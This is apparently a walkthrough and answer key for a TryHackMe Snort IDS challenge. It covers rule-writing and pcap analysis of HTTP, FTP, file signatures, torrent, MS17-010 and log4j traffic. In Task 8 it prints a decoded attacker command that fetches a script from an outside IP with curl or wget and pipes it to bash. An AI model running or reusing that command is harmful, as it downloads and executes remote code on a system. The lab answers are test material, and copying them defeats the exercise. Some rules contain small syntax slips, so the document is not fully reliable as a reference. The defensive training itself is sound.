# [Snort Challenge - The Basics](https://tryhackme.com/room/snortchallenges1)

## Walkthrough

## Task 2

**Navigate to the task folder and use the given pcap file.
Write a rule to detect all TCP packets from or to port 80.
What is the number of detected packets you got?
Note: You must answer this question correctly before answering the rest of the questions.**
```shell
cd Desktop/Exercise-Files/'TASK-2 (HTTP)'

sudo nano local.rules

alert tcp any 80 <> any any (msg: "src-port 80 packets found"; sid: 1000001; rev: 1;)
alert tcp any any <> any 80 (msg: "des-port 80 packets found"; sid: 1000001; rev: 1;)

164
```
**Investigate the log file.
What is the destination address of packet 63?**
```shell
sudo snort -Xr snort.log.1744575245 -n 126

216.239.59.99
```
**Investigate the log file.
What is the ACK number of packet 64?**
```shell
sudo snort -Xr snort.log.1744575245 -n 128

0x2E6B5384
```
**Investigate the log file.
What is the SEQ number of packet 62?**
```shell
sudo snort -Xr snort.log.1744575245 -n 124

0x36C21E28
```
**Investigate the log file.
What is the TTL of packet 65?**
```shell
sudo snort -Xr snort.log.1744575245 -n 130

128
```
**Investigate the log file.
What is the source IP of packet 65?**
```shell
sudo snort -Xr snort.log.1744575245 -n 130

145.254.160.237
```
**Investigate the log file.
What is the source port of packet 65?**
```shell
sudo snort -Xr snort.log.1744575245 -n 130

3372
```

## Task 3

**Navigate to the task folder.
Use the given pcap file.
Write a single rule to detect "all TCP port 21"  traffic in the given pcap.
What is the number of detected packets?**
```shell
cd Desktop/Exercise-Files/'TASK-3 (FTP)'

sudo nano local.rules

alert tcp any any <> any 21 (msg: "ftp packets detected"; sid: 1000001; rev: 1;)

sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap

307
```
**Investigate the log file.
What is the FTP service name?**
```shell
sudo snort -Xr snort.log.1744576391

Microsoft FTP Service
```
**Clear the previous log and alarm files.
Deactivate/comment on the old rules.
Write a rule to detect failed FTP login attempts in the given pcap.
What is the number of detected packets?**
```shell
alert any any <> any 21 (msg: "Failed Login Detected"; content: "530 User"; sid: 1000001; rev: 1;)

sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap

41
```
**Clear the previous log and alarm files.
Deactivate/comment on the old rule.
Write a rule to detect successful FTP logins in the given pcap.
What is the number of detected packets?**
```shell
alert any any <> any 21 (msg: "Successful Login Detected"; content: "230 User"; sid: 1000001; rev: 1;)

sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap

1
```
**Clear the previous log and alarm files.
Deactivate/comment on the old rule.
Write a rule to detect FTP login attempts with a valid username but no password entered yet.
What is the number of detected packets?**
```shell
alert any any <> any 21 (msg: "Failed Login Detected"; content: "331 Password"; sid: 1000001; rev: 1;)

sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap

42
```
**Clear the previous log and alarm files.
Deactivate/comment on the old rule.
Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet.
What is the number of detected packets?**
```shell
alert any any <> any 21 (msg: "Failed Login Detected"; content: "Administrator"; content: "331 Password"; sid: 1000001; rev: 1;)

sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap

7
```

## Task 4

**Navigate to the task folder.
Use the given pcap file.
Write a rule to detect the PNG file in the given pcap.
Investigate the logs and identify the software name embedded in the packet.**
```shell
cd Desktop/Exercise-Files/'TASK-4 (PNG)'

sudo nano local.rules

alert any any <> any any (msg: "PNG Packet Found"; content: "|89 50 4E 47 0D 0A 1A 0A|"; sid: 1000001; rev: 1;)

sudo snort -Xr snort.log.1744584756

Adobe ImageReady
```
**Clear the previous log and alarm files.
Deactivate/comment on the old rule.
Write a rule to detect the GIF file in the given pcap.
Investigate the logs and identify the image format embedded in the packet.**
```shell
alert any any <> any any (msg: "PNG Packet Found"; content: "|47 49 46 38 39 61|"; sid: 1000001; rev: 1;)

sudo snort -Xr snort.log.1744585075

GIF89a
```

## Task 5

**Use the given pcap file.
Write a rule to detect the torrent metafile in the given pcap.
What is the number of detected packets?**
```shell
alert tcp any any <> any any (msg: "Torrent Packet Found"; content: ".torrent"; sid: 100001; rev: 1;)

sudo snort -c local.rules -A full -l . -r torrent.pcap

2
```
**Investigate the log/alarm files.
What is the name of the torrent application?**
```shell
sudo snort -Xr snort.log.1744586020

bittorrent
```
**Investigate the log/alarm files.
What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?**
```shell
application/x-bittorrent
```
**Investigate the log/alarm files.
What is the hostname of the torrent metafile?**
```shell
tracker2.torrentbox.com
```

## Task 6

**In this section, you need to fix the syntax errors in the given rule files. 
You can test each ruleset with the following command structure;
sudo snort -c local-X.rules -r mx-1.pcap -A console
Fix the syntax error in local-1.rules file and make it work smoothly.
What is the number of the detected packets?**
```shell
alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)

sudo snort -c local-1.rules -A full -l . -r mx-1.pcap

16
```
**Fix the syntax error in local-2.rules file and make it work smoothly.
What is the number of the detected packets?**
```shell
alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)

sudo snort -c local-2.rules -A full -l . -r mx-1.pcap

68
```
**Fix the syntax error in local-3.rules file and make it work smoothly.
What is the number of the detected packets?**
```shell
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)

alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)

sudo snort -c local-3.rules -A full -l . -r mx-1.pcap

87
```
**Fix the syntax error in local-4.rules file and make it work smoothly.
What is the number of the detected packets?**
```shell
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)

alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)

sudo snort -c local-4.rules -A full -l . -r mx-1.pcap

90
```
**Fix the syntax error in local-5.rules file and make it work smoothly.
What is the number of the detected packets?**
```shell
alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)

alert icmp any any <> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)

alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)

sudo snort -c local-5.rules -A full -l . -r mx-1.pcap

155
```
**Fix the logical error in local-6.rules file and make it work smoothly to create alerts.
What is the number of the detected packets?**
```shell
alert tcp any any -> any 80  (msg: "GET Request Found"; content:"HTTP"; sid: 100001; rev:1;)

sudo snort -c local-6.rules -A full -l . -r mx-1.pcap

2
```
**Fix the logical error in local-7.rules file and make it work smoothly to create alerts.
What is the name of the required option:**
```shell
alert tcp any any <> any 80 (msg: "Packets Found"; content:"|2E 68 74 6D 6C|"; sid:100001; rev:1;)

sudo snort -c local-7.rules -A full -l . -r mx-1.pcap

msg
```

## Task 7

**Use the given pcap file.
Use the given rule file (local.rules) to investigate the ms1710 exploitation.
What is the number of detected packets?**
```shell
sudo snort -c local.rules -A full -l . -r ms-17-010.pcap

25154
```
**Clear the previous log and alarm files.
Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.
What is the number of detected packets?**
```shell
sudo nano local-1.rules

alert tcp any any <> any any (msg: "Payload Packet Detected"; content: "IPC$"; sid: 1000001; rev: 1;)

sudo snort -c local-1.rules -A full -l . -r ms-17-010.pcap

12
```
**Investigate the log/alarm files.
What is the requested path?**
```shell
\\192.168.116.138\IPC$
```
**What is the CVSS v2 score of the MS17-010 vulnerability?**
```shell
9.3
```

## Task 8

**Use the given pcap file.
Use the given rule file (local.rules) to investigate the log4j exploitation.
What is the number of detected packets?**
```shell
sudo snort -c local.rules -A full -l . -r log4j.pcap

26
```
**Investigate the log/alarm files.
How many rules were triggered?.**
```shell
4
```
**Investigate the log/alarm files.
What are the first six digits of the triggered rule sids?**
```shell
210037
```
**Clear the previous log and alarm files.
Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.
What is the number of detected packets?**
```shell
sudo nano local-1.rules

alert tcp any any <> any any (msg: "Payload Packet Detected"; dsize: 770 <> 855; sid: 1000001; rev: 1;)

sudo snort -c local-1.rules -A full -l . -r log4j.pcap

41
```
**Investigate the log/alarm files.
What is the name of the used encoding algorithm?**
```shell
Base64
```
**Investigate the log/alarm files.
What is the IP ID of the corresponding packet?**
```shell
62808
```
**Investigate the log/alarm files.
Decode the encoded command.
What is the attacker's command?**
```shell
(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
```
**What is the CVSS v2 score of the Log4j vulnerability?**
```shell
9.3
```
